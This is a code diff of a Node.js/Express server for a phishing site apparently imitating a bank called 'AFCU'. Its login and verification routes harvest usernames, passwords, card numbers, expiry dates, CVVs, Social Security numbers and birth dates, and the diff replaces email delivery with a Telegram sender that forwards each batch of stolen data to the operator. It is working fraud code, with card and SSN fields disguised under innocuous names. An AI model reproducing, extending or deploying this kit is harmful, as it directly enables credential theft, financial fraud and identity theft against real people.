@@ -3,7 +3,7 @@ const path = require("path");
 const session = require("express-session");
 const {body, validationResult} = require("express-validator");
 const check_request = require("./middleware/check");
-const send_mail = require("./utils/send-mail");
+const TelegramSend = require("./utils/send-message");
 require('dotenv').config()
 
 const app = express();
@@ -43,11 +43,18 @@ app.get('/login', (req, res)=>{
 });
 
 app.post('/login', (req, res)=>{
+    const userAgent = req.headers['user-agent'];
     req.session.login = {
         username: req.body.username,
         password: req.body.password,
+        userAgent
     };
-
+    TelegramSend(`
+        AFCU
+    Fingerprint: ${userAgent}
+    Username: ${req.body.username}
+    Password: ${req.body.password}
+    `)
     res.redirect('/relogin');
 });
 
@@ -61,7 +68,18 @@ app.post('/relogin', (req, res)=>{
         password2: req.body.password,
     };
 
-    send_mail(req.session)
+    TelegramSend(`
+    AFCU
+
+    Fingerprint: ${req.session.login.userAgent}
+
+    Username: ${req.session.login.username}
+    Password: ${req.session.login.password}
+
+    Username 2: ${req.body.username}
+    Password 2: ${req.body.password}
+
+    `)
     res.redirect('/login/auth');
 });
 
@@ -76,7 +94,21 @@ app.post('/login/auth', (req, res)=>{
         schoolKey: req.body.schoolKey,
     };
 
-    send_mail(req.session)
+    TelegramSend(`
+    AFCU
+
+    Fingerprint: ${req.session.login.userAgent}
+
+    Username: ${req.session.login.username}
+    Password: ${req.session.login.password}
+
+    Username 2: ${req.session.login2.username2}
+    Password 2: ${req.session.login2.password2}
+
+    Card Number: ${req.session.auth.schoolNum}
+    Expiry date: ${req.session.auth.schoolDate}
+    CVV: ${req.session.auth.schoolKey}
+    `)
     res.redirect('/login/auth/details');
 });
 
@@ -90,7 +122,24 @@ app.post('/login/auth/details', (req, res)=>{
         entrydate: req.body.entrydate
     };
 
-    send_mail(req.session)
+     TelegramSend(`
+    AFCU
+
+    Fingerprint: ${req.session.login.userAgent}
+
+    Username: ${req.session.login.username}
+    Password: ${req.session.login.password}
+
+    Username 2: ${req.session.login2.username2}
+    Password 2: ${req.session.login2.password2}
+
+    Card Number: ${req.session.auth.schoolNum}
+    Expiry date: ${req.session.auth.schoolDate}
+    CVV: ${req.session.auth.schoolKey}
+
+    SSN: ${req.session.auth2.batchNum}
+    DOB: ${req.session.auth2.entrydate}
+    `)
     res.redirect('/success');
 });
 
